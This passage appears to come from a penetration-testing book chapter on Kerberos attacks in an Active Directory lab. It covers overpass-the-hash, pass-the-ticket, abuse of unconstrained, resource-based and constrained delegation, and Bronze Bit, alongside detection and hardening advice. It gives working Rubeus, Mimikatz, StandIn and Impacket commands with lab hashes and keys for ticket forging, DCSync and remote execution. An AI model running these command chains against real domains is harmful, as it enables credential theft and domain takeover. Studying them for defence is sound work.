<p>Pass-the-key<a id="_idIndexMarker356"/> and overpass-the-hash are attacks<a id="_idIndexMarker357"/> aimed at Kerberos authentication. The plan<a id="_idIndexMarker358"/> is to obtain<a id="_idIndexMarker359"/> a valid Kerberos TGT by supplying the user’s secret key (<strong class="bold">DES</strong>, <strong class="bold">RC4</strong>, <strong class="bold">AES128</strong>, or<strong class="bold"> AES256</strong>) derived from the user’s<a id="_idIndexMarker360"/> password. If RC4 is enabled, meaning that the user’s NT hash is a key, this is <strong class="bold">overpass-the-hash</strong>. If RC4 is disabled, other Kerberos keys can be passed, and it is called <strong class="bold">pass-the-key</strong>. Now, by default, Windows is using <strong class="bold">AES256</strong> keys, which have an encryption<a id="_idIndexMarker361"/> type value of <strong class="source-inline">0x12</strong>. Requesting downgraded RC4 encryption will have an encryption type value of <strong class="source-inline">0x17</strong>. This value can be found in event <strong class="source-inline">4768</strong> on the domain controller. Using Rubeus as an attacker, a normal user can request Kerberos TGT by running the <span class="No-Break">following command:</span></p>
<pre class="console">
Rubeus.exe asktgt /domain:sevenkingdoms.local /user:robert.baratheon /rc4:9029CF007326107EB1C519C84EA60DBE /ptt</pre> <p>As a result, a ticket<a id="_idIndexMarker362"/> will be injected into memory and access to the <strong class="source-inline">c$</strong> domain controller<a id="_idIndexMarker363"/> will be granted, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer109">
<img alt="Figure 5.18 – Injected ticket because of overpass-the-hash" height="459" src="image/B18964_05_18.jpg" width="668"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.18 – Injected ticket because of overpass-the-hash</p>
<p>The following is event <strong class="source-inline">4768</strong> with RC4 <span class="No-Break">downgrade requested:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer110">
<img alt="Figure 5.19 – Downgraded encryption type in event 4768" height="307" src="image/B18964_05_19.jpg" width="388"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.19 – Downgraded encryption type in event 4768</p>
<p>Both techniques <a id="_idIndexMarker364"/>can be detected on the endpoint via the LSASS access rule if Mimikatz is used<a id="_idIndexMarker365"/> and there will be a mismatch between the logged-on user and its Kerberos tickets. Encryption type downgrades stand out in modern Windows environments and will be investigated. Rubeus has the <strong class="source-inline">/opsec</strong> flag, which will send an initial AS-REQ without pre-authentication mimicking genuine requests. This option is intended to make traffic stealthier, which is why only the <strong class="source-inline">AES256</strong> encryption type is allowed to be used. Such a key can be dumped by <span class="No-Break">using Mimikatz:</span></p>
<pre class="console">
mimikatz.exe "privilege::debug" "sekurlsa::ekeys"</pre> <p>Let’s create another ticket and compare the generated event with the <span class="No-Break">previous one:</span></p>
<pre class="console">
Rubeus.exe asktgt /user:robert.baratheon /aes256:6b5468ea3a7f5cac5 e2f580ba6ab975ce452833e9215fa002ea8405f88e5294d /opsec /ptt</pre> <p>The Windows event is shown in the <span class="No-Break">following screenshot:</span></p>
<p class="IMG---Figure"> </p>
<div>
<div class="IMG---Figure" id="_idContainer111">
<img alt="Figure 5.20 – Rubeus with the /opsec option in event 4768" height="307" src="image/B18964_05_20.jpg" width="387"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.20 – Rubeus with the /opsec option in event 4768</p>
<p>We can see that <strong class="bold">Ticket Options</strong> (thank you, <strong class="source-inline">/opsec</strong> option) and <strong class="bold">Ticket Encryption Type</strong> changed. Another thing to consider if we want to fully mimic real Kerberos authentication is <strong class="bold">Supplied Realm Name</strong>, which will be <strong class="source-inline">SEVENKINGDOMS</strong> for genuine requests ( the <strong class="source-inline">/domain</strong> option for the <span class="No-Break">rescue here):</span></p>
<div>
<div class="IMG---Figure" id="_idContainer112">
<img alt="Figure 5.21 – Supplied Realm Name for genuine TGT request" height="100" src="image/B18964_05_21.jpg" width="346"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.21 – Supplied Realm Name for genuine TGT request</p>
<p>The most challenging problem<a id="_idIndexMarker366"/> is that Rubeus will generate Kerberos traffic, meaning it can be detected<a id="_idIndexMarker367"/> by all sorts of defensive tools. This is something that needs to <span class="No-Break">be considered.</span></p>
<h2 id="_idParaDest-100"><a id="_idTextAnchor104"/>Pass-the-ticket</h2>
<p>Finally, we can encounter<a id="_idIndexMarker368"/> situations when we obtain a ticket to inject, or we are able to forge one. We will discuss four types of forged tickets with examples of how to forge, use, and detect them in <a href="B18964_07.xhtml#_idTextAnchor146"><span class="No-Break"><em class="italic">Chapter 7</em></span></a><span class="No-Break">.</span></p>
<p>Also, tickets can be dumped from memory or found on the filesystem in Linux (<strong class="source-inline">.ccache</strong>) or Windows (<strong class="source-inline">.kirbi</strong>) formats. In Windows, tickets after injection (the <strong class="source-inline">/ptt</strong> option in Rubeus) can be used natively, as we have seen in the previous example. Let’s use the same ticket but on our Kali machine. First, we need to convert it from the <strong class="source-inline">kirbi</strong> to <strong class="source-inline">ccache</strong> format using <strong class="bold">ticketConverter</strong> from Impacket, then export the ticket. The commands are shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer113">
<img alt="Figure 5.22 – Ticket conversion from Rubeus" height="161" src="image/B18964_05_22.jpg" width="726"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.22 – Ticket conversion from Rubeus</p>
<p>Then, we can use the ticket for remote access using the following command (you just need to add entries to <strong class="source-inline">/etc/hosts</strong> on your <span class="No-Break">Kali machine):</span></p>
<pre class="console">
impacket-wmiexec -k -no-pass sevenkingdoms.local/robert.baratheon@kingslanding.sevenkingdoms.local</pre> <p>The code execution is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer114">
<img alt="Figure 5.23 – Pass-the-ticket for command execution" height="204" src="image/B18964_05_23.jpg" width="824"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.23 – Pass-the-ticket for command execution</p>
<p class="callout-heading">Note</p>
<p class="callout">The detection guide<a id="_idIndexMarker369"/> for this attack can be found here: <a href="https://www.netwrix.com/pass_the_ticket.xhtml">https://www.netwrix.com/pass_the_ticket.xhtml</a>. In general, the strategy is the same as for the pass-the-key attack. There is a proof-of-concept code published to check the mismatch between logged-on users and issued <span class="No-Break">Kerberos tickets[12].</span></p>
<p>In the next section, we will be covering three types of Kerberos delegation and how they can be abused for lateral movement. This type<a id="_idIndexMarker370"/> of attack can also be considered a <strong class="bold">privilege </strong><span class="No-Break"><strong class="bold">escalation attack</strong></span><span class="No-Break">.</span></p>
<h1 id="_idParaDest-101"><a id="_idTextAnchor105"/>Kerberos delegation</h1>
<p>First of all, we need<a id="_idIndexMarker371"/> to discuss what delegation is and why it exists. Services within Active Directory sometimes need to be accessed by other services on behalf of the domain user. Think of a web server authenticating to the database on the backend<a id="_idIndexMarker372"/> on behalf of the user. There are three types of delegation available in <strong class="bold">Active Directory</strong> (<strong class="bold">AD</strong>) – <strong class="bold">unconstrained</strong>, <strong class="bold">constrained</strong>, and <strong class="bold">resource-based</strong>. Information about delegation can be found by using BloodHound, PowerView, or the AD module. We will cover the types of delegation in the following <span class="No-Break">respective sections.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">For our lab, <em class="italic">Mayfly</em> prepared, as usual, a great walk-through to <span class="No-Break">follow: </span><a href="https://mayfly277.github.io/posts/GOADv2-pwning-part10/"><span class="No-Break">https://mayfly277.github.io/posts/GOADv2-pwning-part10/</span></a><span class="No-Break">.</span></p>
<h2 id="_idParaDest-102"><a id="_idTextAnchor106"/>Unconstrained delegation</h2>
<p>We will start our journey<a id="_idIndexMarker373"/> with the oldest type of delegation. With unconstrained delegation<a id="_idIndexMarker374"/> enabled on the computer or user, it is possible to impersonate an authenticating user or computer to any service on any host. If we compromise the user or machine with unconstrained delegation, we can then wait or force authentication to it, extract from ST cached in memory copy of the target user/computer TGT, and then reuse it for access across the domain or even forest. By default, domain controllers have unconstrained <span class="No-Break">delegation enabled.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">I will suggest having a look at <a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained">https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained</a> for reference on how unconstrained delegation<a id="_idIndexMarker375"/> can be abused from an attacker’s <span class="No-Break">Linux machine.</span></p>
<p>We will enable unconstrained delegation<a id="_idIndexMarker376"/> on Castelrock, as shown<a id="_idIndexMarker377"/> in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer115">
<img alt="Figure 5.24 – Castelrock with unconstrained delegation enabled" height="198" src="image/B18964_05_24.jpg" width="383"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.24 – Castelrock with unconstrained delegation enabled</p>
<p>To find computers with unconstrained delegation, we can <span class="No-Break">use PowerView:</span></p>
<pre class="console">
Get-DomainComputer -Unconstrained | select dnshostname, useraccountcontrol</pre> <p>The output shows the domain controller (<strong class="source-inline">kingslanding</strong>) and the <strong class="source-inline">castelrock</strong> server with the <strong class="source-inline">TRUSTED_FOR_DELEGATION</strong> flag in the <span class="No-Break"><strong class="source-inline">useraccountcontrol</strong></span><span class="No-Break"> attribute:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer116">
<img alt="Figure 5.25 – Computer with unconstrained delegation enabled" height="89" src="image/B18964_05_25.jpg" width="762"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.25 – Computer with unconstrained delegation enabled</p>
<p class="callout-heading">Note</p>
<p class="callout">Also, we can use the LDAP <span class="No-Break">filter (</span><span class="No-Break"><strong class="source-inline">userAccountControl:1.2.</strong></span><strong class="source-inline"> 840.113556.1.4.803:=524288</strong>) together with the AD PowerShell module. </p>
<p>As a next step, we assume that we were able to compromise the <strong class="source-inline">castelrock</strong> server, so we can abuse unconstrained delegation. From an elevated context, we will launch Rubeus in <span class="No-Break">monitoring mode:</span></p>
<pre class="console">
Rubeus.exe monitor /interval:3 /nowrap</pre> <p>From the standard user context, we force authentication from the domain controller by <span class="No-Break">using PrinterBug:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer117">
<img alt="Figure 5.26 – Forcing the domain controller to authenticate" height="148" src="image/B18964_05_26.jpg" width="1172"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.26 – Forcing the domain controller to authenticate</p>
<p>As a result, we captured<a id="_idIndexMarker378"/> the domain <a id="_idIndexMarker379"/><span class="No-Break">controller’s TGT:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer118">
<img alt="Figure 5.27 – TGT of domain controller" height="627" src="image/B18964_05_27.jpg" width="1321"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.27 – TGT of domain controller</p>
<p>Now, we inject this ticket in memory with Rubeus and use Mimikatz to dump the domain admin <span class="No-Break">NT hash:</span></p>
<pre class="console">
Rubeus.exe ptt /ticket:"base64_ticket_from_capture"
Mimikatz.exe "lsadump::dcsync /user:robert.baratheon"</pre> <p>The result of the previous<a id="_idIndexMarker380"/> command can be seen<a id="_idIndexMarker381"/> in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer119">
<img alt="Figure 5.28 – Domain admin user’s NT hash" height="724" src="image/B18964_05_28.jpg" width="812"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.28 – Domain admin user’s NT hash</p>
<p class="callout-heading">Note</p>
<p class="callout">A great example of how unconstrained delegation can be abused using <strong class="source-inline">krbrelayx</strong> is shown in this blog <span class="No-Break">post: </span><a href="https://pentestlab.blog/2022/03/21/unconstrained-delegation/"><span class="No-Break">https://pentestlab.blog/2022/03/21/unconstrained-delegation/</span></a><span class="No-Break">.</span></p>
<p>To prevent abuse, check whether<a id="_idIndexMarker382"/> the unconstrained delegation <a id="_idIndexMarker383"/>is enabled only on domain controllers. If unconstrained delegation is absolutely required elsewhere, ensure that all privileged accounts have the <strong class="bold">sensitive and cannot be delegated</strong> flag or are members of the <strong class="source-inline">Protected Users</strong> group, as TGT<a id="_idIndexMarker384"/> will not be delegated<a id="_idIndexMarker385"/> in the service ticket for <span class="No-Break">such accounts.</span></p>
<h2 id="_idParaDest-103"><a id="_idTextAnchor107"/>Resource-based constrained delegation</h2>
<p>In Windows 2012, a new delegation<a id="_idIndexMarker386"/> type was introduced, called <strong class="bold">resource-based constrained delegation</strong> (<strong class="bold">RBCD</strong>). The idea is that delegation<a id="_idIndexMarker387"/> is configured by the service administrator on the target, not on the source. This is written in the <strong class="source-inline">msDS-AllowedToActOnBehalfOfOtherIdentity</strong> attribute. The most common way to abuse RBCD is to create a computer account, edit the target delegation attribute, and obtain <span class="No-Break">a ticket.</span></p>
<p>First of all, we will start<a id="_idIndexMarker388"/> with enumeration. We need to find out the <strong class="bold">machine account quota</strong> value (by default, every domain user can create 10 accounts), and check whether RBCD has been already<a id="_idIndexMarker389"/> implemented and whether there are <strong class="source-inline">GenericAll</strong> or <strong class="source-inline">GenericWrite</strong> <strong class="bold">Access Control List</strong> (<strong class="bold">ACLs</strong>) on any computer in <span class="No-Break">the domain.</span></p>
<p>The machine quota can be found with the help of the <strong class="source-inline">StandIn</strong> tool[13] written <span class="No-Break">by </span><span class="No-Break"><em class="italic">FuzzySec:</em></span></p>
<pre class="console">
StandIn.exe --object ms-DS-MachineAccountQuota=*</pre> <p>We can see that this domain uses the <span class="No-Break">default value:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer120">
<img alt="Figure 5.29 – Default machine account quota value" height="56" src="image/B18964_05_29.jpg" width="386"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.29 – Default machine account quota value</p>
<p>You can also enumerate a machine account quota <span class="No-Break">with PowerView:</span></p>
<pre class="console">
Get-DomainObject -Identity "dc=sevenkingdoms,dc=local" -Domain sevenkingdoms.local</pre> <p>The next step is to enumerate an ACL in the domain. We can do it with PowerView’s <strong class="source-inline">Invoke-ACLScanner</strong> or a similar tool. The interesting output is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer121">
<img alt="Figure 5.30 – The user has GenericAll on the domain controller" height="174" src="image/B18964_05_30.jpg" width="631"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.30 – The user has GenericAll on the domain controller</p>
<p>Now, we can create<a id="_idIndexMarker390"/> a computer account<a id="_idIndexMarker391"/> by using PowerMad[14], or <strong class="source-inline">addcomputer</strong> from Impacket, or, in our <span class="No-Break">case, </span><span class="No-Break"><strong class="source-inline">StandIn</strong></span><span class="No-Break">:</span></p>
<pre class="console">
StandIn.exe --computer MyDesktop --make</pre> <p>The result is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer122">
<img alt="Figure 5.31 – A new computer account is created" height="88" src="image/B18964_05_31.jpg" width="494"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.31 – A new computer account is created</p>
<p>If we compromise the <strong class="source-inline">stannis.baratheon</strong> user who can change attributes on <strong class="source-inline">kingslanding</strong>, then add a computer account to the domain, we can set the <strong class="source-inline">msDS-AllowedToActOnBehalfOfOtherIdentity</strong> property to a newly created computer account using the PowerShell AD module, PowerView, <span class="No-Break">or StandIn:</span></p>
<pre class="console">
Get-DomainComputer "MyDesktop" -Properties objectsid
StandIn.exe --computer "kingslanding" --sid "S-1-5-21-4243769114-3325725031-2403382846-1122"</pre> <p>The result of the previous commands is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer123">
<img alt="Figure 5.32 – A new computer account is created" height="196" src="image/B18964_05_32.jpg" width="842"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.32 – A new computer account is created</p>
<p>Now, we<a id="_idIndexMarker392"/> can obtain<a id="_idIndexMarker393"/> <span class="No-Break">a ticket:</span></p>
<pre class="console">
Rubeus.exe hash /password:cQkFGq47oafTact /user:MyDesktop$ /domain:sevenkingdoms.local
Rubeus.exe s4u /user:MyDesktop$ /aes256:10AB7F32 B28F27AA7903D168C32C12A469EC7174783D6B5F52E8C10831FBE605 /msdsspn:http/kingslanding /impersonateuser:administrator /ptt</pre> <p>The result can be seen in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer124">
<img alt="Figure 5.33 – Successful RBCD attack" height="301" src="image/B18964_05_33.jpg" width="712"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.33 – Successful RBCD attack</p>
<p>Also, we can achieve persistence by using the RACE toolkit written by <em class="italic">Nikhil Mittal</em> by modifying the permissions of a <span class="No-Break">computer object.</span></p>
<p>To prevent RBCD abuse, we can review ACL in the domain on a regular basis, reduce the machine account quota to <strong class="source-inline">0</strong> (<strong class="source-inline">ms-DS-MachineAccountQuota</strong>), and ensure that only privileged users can add machines to the domain. Also, apply the <strong class="bold">is sensitive and cannot be delegated</strong> account property and the <strong class="source-inline">Protected Users</strong> group for high-privileged accounts. It is important<a id="_idIndexMarker394"/> to mention that just setting<a id="_idIndexMarker395"/> the machine account quota to <strong class="source-inline">0</strong> does not prevent <span class="No-Break">this attack[15</span><span class="No-Break">].</span></p>
<h2 id="_idParaDest-104"><a id="_idTextAnchor108"/>Constrained delegation</h2>
<p>The main difference between unconstrained <a id="_idIndexMarker396"/>and constrained delegation is that an account<a id="_idIndexMarker397"/> is allowed to impersonate users only against certain services. It can be configured with (<strong class="bold">Use any authentication protocol</strong>) or without (<strong class="bold">Use Kerberos only</strong>) protocol transition, as shown in the following <span class="No-Break">delegation properties:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer125">
<img alt="Figure 5.34 – Constrained delegation configuration" height="272" src="image/B18964_05_34.jpg" width="379"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.34 – Constrained delegation configuration</p>
<p>Delegation<a id="_idIndexMarker398"/> in this case uses<a id="_idIndexMarker399"/> two Kerberos extensions, called <a id="_idTextAnchor109"/><strong class="bold">Service for User to Self</strong> (<strong class="bold">S4U2Self</strong>) and <strong class="bold">Service for User to </strong><span class="No-Break"><strong class="bold">Proxy</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="bold">S4U2Proxy</strong></span><span class="No-Break">).</span></p>
<p class="callout-heading">Note</p>
<p class="callout">A deep dive into the Kerberos<a id="_idIndexMarker400"/> extensions and how they work can be found <span class="No-Break">here: </span><span class="No-Break">https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-theory/</span><span class="No-Break">.</span></p>
<p>In brief, the S4U2Proxy protocol allows one service to obtain a service ticket for another service on behalf of a user in constrained delegation without a protocol transition case. S42Self is used in the protocol transition case, allowing the service to obtain a service ticket for itself on behalf of a user when Kerberos was not used for authentication (for example, NTLM v2). Then, the S4U2Proxy protocol can be followed, <span class="No-Break">as usual.</span></p>
<p>Constrained delegation<a id="_idIndexMarker401"/> can be configured for user and computer<a id="_idIndexMarker402"/> accounts. Enumeration with PowerView can be done with the <span class="No-Break">following commands:</span></p>
<pre class="console">
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select dnshostname, msds-allowedtodelegateto</pre> <p>The result of enumeration is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer126">
<img alt="Figure 5.35 – Enumerate users and computers with constrained delegation enabled" height="247" src="image/B18964_05_35.jpg" width="1017"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.35 – Enumerate users and computers with constrained delegation enabled</p>
<p>Another way is to use the <strong class="source-inline">findDelegation</strong> Python script <span class="No-Break">from Impacket:</span></p>
<pre class="console">
findDelegation.py NORTH.SEVENKINGDOMS.LOCAL/samwell.tarly:Heartsbane -target-domain north.sevenkingdoms.local</pre> <p>The result will show a constrained delegation type <span class="No-Break">as well:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer127">
<img alt="Figure 5.36 – Enumerate delegation type" height="230" src="image/B18964_05_36.jpg" width="1141"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.36 – Enumerate delegation type</p>
<p>Constrained delegation<a id="_idIndexMarker403"/> with protocol transition can be abused<a id="_idIndexMarker404"/> with the <span class="No-Break">following command:</span></p>
<pre class="console">
Rubeus.exe s4u /msdsspn:CIFS/winterfell /impersonateuser:Administrator /domain:north.sevenkingdoms.local /user:jon.snow /rc4:B8D76E56E9DAC90539AFF05E3CCB1755 /altservice:HTTP /ptt
winrs -r:winterfell cmd.exe</pre> <p>The result can be seen in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer128">
<img alt="Figure 5.37 – Result of constrained delegation with protocol transition abuse" height="88" src="image/B18964_05_37.jpg" width="445"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.37 – Result of constrained delegation with protocol transition abuse</p>
<p>It is important to mention that the SPN part is not encrypted in the request, which is why we can use<a id="_idTextAnchor110"/><a id="_idTextAnchor111"/> the <strong class="source-inline">/altservice</strong> option from Rubeus to get a service ticket – in our <span class="No-Break">case, WinRM.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">A great list <a id="_idIndexMarker405"/>of available services can be found <span class="No-Break">here: </span><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#available-services"><span class="No-Break">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#available-services</span></a><span class="No-Break">.</span></p>
<p>The HTTP service is configured without protocol transition, as in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer129">
<img alt="Figure 5.38 – Configured constrained delegation without protocol transition" height="260" src="image/B18964_05_38.jpg" width="713"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.38 – Configured constrained delegation without protocol transition</p>
<p>In this case, S4U2Self requests<a id="_idIndexMarker406"/> will not result in a forwardable ticket, thus S4U2Proxy<a id="_idIndexMarker407"/> will not work. Two known ways to abuse constrained delegation without protocol transition are by operating an RBCD attack on the service or by forcing a user to authenticate to the service to extract the ticket. To abuse constrained delegation without protocol transition, we will create a computer account, and set <strong class="source-inline">castelblack</strong> to allow RBCD from it (we need <strong class="source-inline">SYSTEM</strong> access to set this property). Then, we will delegate as <strong class="source-inline">administrator</strong> into <strong class="source-inline">castelblack</strong>, and finally, we can use this forwardable ST in the S4U2Proxy request to service on <strong class="source-inline">Winterfell</strong>. It sounds complicated, but we will execute this attack step <span class="No-Break">by step.</span></p>
<p>In the first step, we will create<a id="_idIndexMarker408"/> a session as <strong class="source-inline">Castelblack$</strong>, cr<a id="_idTextAnchor112"/>eate a computer account named <strong class="source-inline">Test$</strong>, retrieve its <strong class="bold">Security Identifier</strong> (<strong class="bold">SID</strong>), and set the <strong class="source-inline">msDS-AllowedToActOnBehalfOfOtherIdentity</strong> attribute of <strong class="source-inline">Castelblack$</strong> to <strong class="source-inline">Test$</strong>. I will use Mimikatz, PowerView, <span class="No-Break">and StandIn:</span></p>
<pre class="console">
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:castelblack$ /ntlm:abd0f0459c9d6119d092d1bd87cb958b /domain:north.sevenkingdoms.local /run:cmd.exe"
StandIn.exe --computer Test --make
Get-DomainComputer -Name Test -Properties objectsid
StandIn.exe --computer castelblack --sid S-1-5-21-3600105556-770076851-109492085-1605</pre> <p>The result of the StandIn commands is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer130">
<img alt="Figure 5.39 – Creating a computer account and preparing RBCD abuse" height="326" src="image/B18964_05_39.jpg" width="803"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.39 – Creating a computer account and preparing RBCD abuse</p>
<p>Next, we will calculate the AES256 key from the computer account’s password and abuse RBCD using <strong class="source-inline">Test$</strong> on <strong class="source-inline">Castelblack$</strong>. Now, we have forwardable ST <span class="No-Break">for </span><span class="No-Break"><strong class="source-inline">Castelblack$</strong></span><span class="No-Break">:</span></p>
<pre class="console">
Rubeus.exe hash /domain:north.sevenkingdoms.local /user:test$ /password:yN26WROLQvUCa30
Rubeus.exe s4u /user:test$ /aes256:5D2320ABFAFEA7 A451DC0883CB120047A93E1D38B632D42ACD2997F104D6C30A /impersonateuser:administrator /msdsspn:http/castelblack.north.sevenkingdoms.local /nowrap</pre> <p>Finally, we will use<a id="_idIndexMarker409"/> the forwardable ST<a id="_idIndexMarker410"/> to get access to <span class="No-Break">winterfell</span><span class="No-Break">’s filesystem:</span></p>
<pre class="console">
Rubeus.exe s4u /user:castelblack$ /rc4:abd0f0459c9d6119d092d1bd87cb958b /msdsspn:http/winterfell.north.sevenkingdoms.local /tgs:"ticket_from_previous_step" /altservice:cifs /ptt
dir \\winterfell.north.sevenkingdoms.local\c$</pre> <p>The result of the attack is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer131">
<img alt="Figure 5.40 – Successful abuse of the constrained delegation without protocol transition" height="374" src="image/B18964_05_40.jpg" width="787"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.40 – Successful abuse of the constrained delegation without protocol transition</p>
<p>These steps can be performed<a id="_idIndexMarker411"/> from a Linux machine<a id="_idIndexMarker412"/> too, as shown in the walk-through by the <span class="No-Break">lab creator[16].</span></p>
<h2 id="_idParaDest-105"><a id="_idTextAnchor113"/>Bronze Bit attack aka CVE-2020-17049</h2>
<p>For certain types of delegation<a id="_idIndexMarker413"/> abuse, the ticket needs<a id="_idIndexMarker414"/> to have a <strong class="source-inline">forwardable</strong> flag set. Reasons for the flag not being set can be that the impersonated user is a member of the <strong class="source-inline">Protected Users</strong> group or was configured with the <strong class="bold">is sensitive and cannot be delegated</strong> flag. Also, the service can be configured for <strong class="source-inline">Kerberos only</strong> constrained delegation. In 2020, the Bronze Bit vulnerability was discovered, allowing the attacker to edit the ticket and set the desired <span class="No-Break"><strong class="source-inline">forwardable</strong></span><span class="No-Break"> flag.</span></p>
<p>In practice, we can use a <strong class="source-inline">force-forwardable</strong> flag from the <strong class="source-inline">getST</strong> Python script <span class="No-Break">in Impacket.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">A good practical example with the two most common scenarios can be found <span class="No-Break">here: </span><a href="https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-attack/"><span class="No-Break">https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-attack/</span></a><span class="No-Break">.</span></p>
<p>The only recommendation is to patch the <span class="No-Break">operating system.</span></p>
<p>After lateral movement<a id="_idIndexMarker415"/> inside the domain, the attacker <a id="_idIndexMarker416"/>may propagate further to trusted forests. The next section will cover possible limitations in such movement and introduce available <span class="No-Break">security mechanisms.</span></p>
<h1 id="_idParaDest-106"><a id="_idTextAnchor114"/>Abusing trust for lateral movement</h1>
<p>In this section, we are going to discuss<a id="_idIndexMarker417"/> various ways to abuse forest trust<a id="_idIndexMarker418"/> for lateral movement. Movement from the child to the parent domain inside the forest is covered in <a href="B18964_06.xhtml#_idTextAnchor119"><span class="No-Break"><em class="italic">Chapter 6</em></span></a><span class="No-Break"><em class="italic">/</em></span></p>
<p>We will start by covering the necessary theory and then apply it to practice. As stated by Microsoft, a <strong class="bold">forest</strong> is a security boundary and consists<a id="_idIndexMarker419"/> of one or more AD domains that share a common schema, configuration, and global catalog. <strong class="bold">The schema</strong> defines objects<a id="_idIndexMarker420"/> within the forest, and the global catalog contains a partial attribute set of each object in the forest domains. There are six types of trust relationships; we will focus our attention on the <strong class="source-inline">External</strong> and <strong class="source-inline">Forest</strong> types. To understand<a id="_idIndexMarker421"/> more about<a id="_idIndexMarker422"/> security <a id="_idIndexMarker423"/>boundaries, we need to discuss the <strong class="bold">Security Identifier</strong> (<strong class="bold">SID</strong>), the <strong class="bold">SID history</strong> attribute, and <span class="No-Break"><strong class="bold">SID filtering</strong></span><span class="No-Break">.</span></p>
<p>SID<a id="_idIndexMarker424"/> is a unique identifier assigned to each security principal in the domain. SID filtering is a mechanism that filters out SIDs from <span class="No-Break">other domains.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">Filtering rules<a id="_idIndexMarker425"/> can be found <span class="No-Break">here: </span><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280"><span class="No-Break">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280</span></a><span class="No-Break">.</span></p>
<p>Briefly, there are two main points to remember regarding lateral movement possibility and <span class="No-Break">SID filtering:</span></p>
<ul>
<li>If SID filtering<a id="_idIndexMarker426"/> is fully enforced, all SIDs that are not from a trusted domain will be filtered. However, the <em class="italic">Enterprise Domain Controllers</em> SID, <em class="italic">Trusted Domain Object</em> SIDs, and <em class="italic">NeverFilter</em> SIDs were exempt from domain trust <span class="No-Break">SID filtering[</span><span class="No-Break">17].</span></li>
<li>The <strong class="source-inline">External</strong> trust is more relaxed <span class="No-Break">than </span><span class="No-Break"><strong class="source-inline">Forest</strong></span><span class="No-Break">.</span></li>
</ul>
